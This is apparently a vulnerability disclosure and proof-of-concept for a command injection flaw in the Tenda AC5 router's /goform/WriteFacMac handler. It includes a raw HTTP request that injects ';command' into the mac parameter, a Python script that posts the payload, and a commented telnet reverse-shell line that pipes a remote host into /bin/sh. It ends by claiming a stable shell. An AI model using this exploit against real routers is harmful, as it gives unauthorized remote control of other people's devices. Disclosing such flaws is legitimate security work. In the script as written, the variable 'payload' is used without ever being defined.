## Basic Information

Vendor:Tenda (https://www.tenda.com.cn/default.html)

product:AC5(https://www.tenda.com.cn/product/AC5.html)

version:V15.03.06.28(https://www.tenda.com.cn/download/detail-2740.html) 

type:Arbitrary Remote Command Execution 

author:yanbushuang

## Vulnerability description and trigger location

I found an Arbitrary Command Execution vulnerability in the router's web server-- /bin/httpd of squashfs filesystem. While processing the mac parameters for a post request(when an attacker accesses ip/goform/WriteFacMac), the value is directly passed to doSystem, which causes a RCE. The details are shown below:

![image1](https://github.com/yanbushuang/CVE/blob/main/image-1.png)


![image2](https://github.com/yanbushuang/CVE/blob/main/image-2.png)

## POC(EXP):
```
### Burpsuite：

POST /goform/WriteFacMac HTTP/1.1
Host: 192.168.0.1（You Tenda AC5 Router IP or remote ip）
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: password=You cookie
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
mac = ;command


### python request/pwn：

import requests
from pwn import*

ip = "192.168.211.128" #You Tenda AC5 Router IP or remote ip
url = "http://" + ip + "/goform/WriteFacMac"
print(url)


#payload = ";cmd"
#payload = ";telnet remote_ip remote_port1 | /bin/sh | telnet remote_ip remote_port2"

cookie = {"Cookie":"password=12345"}
data = {"mac": payload}
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
print("HackAttackSuccess!")

```

## Attack demonstration：

Use the above POC to play shell through telnet You can get a very stable shell 


![image3](https://github.com/yanbushuang/CVE/blob/main/image-3.png)


![image4](https://github.com/yanbushuang/CVE/blob/main/image-4.png)

Over~
